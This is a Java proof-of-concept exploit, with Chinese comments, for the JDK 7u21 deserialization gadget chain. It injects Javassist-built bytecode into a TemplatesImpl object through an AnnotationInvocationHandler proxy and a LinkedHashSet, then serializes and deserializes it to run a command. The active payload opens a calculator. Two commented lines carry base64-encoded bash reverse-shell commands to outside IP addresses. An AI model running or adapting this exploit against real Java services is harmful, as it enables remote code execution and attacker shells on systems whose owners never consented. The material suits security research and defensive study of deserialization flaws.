import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

public class exp {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Drunkbaby");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        // new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx}|{base64,-d}|{bash,-i}\"}"
        byte[] evil = getTemplatesImpl("Calc");
        byte[][] codes = {evil};
        setFieldValue(templates, "_bytecodes", codes);

        String evilHashCode = "f5a5a608";
        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap hashMap = new HashMap();
        hashMap.put(evilHashCode,"Drunkbaby");

        // 下面部分搞动态代理，反射获取 AnnotationInvocationHandler 类，再实例化

        Class handler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = handler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Templates.class, hashMap);

        // 创建动态代理

        Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(),
                                                            new Class[]{Templates.class}, invocationHandler);

        // 准备入口类 LinkedHashSet

        HashSet hashSet = new LinkedHashSet();
        hashSet.add(templates);
        hashSet.add(proxy);

        // 将恶意templates设置到map中
        hashMap.put(evilHashCode, templates);
        serialize(hashSet);
        deserialize("ser.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object deserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
}
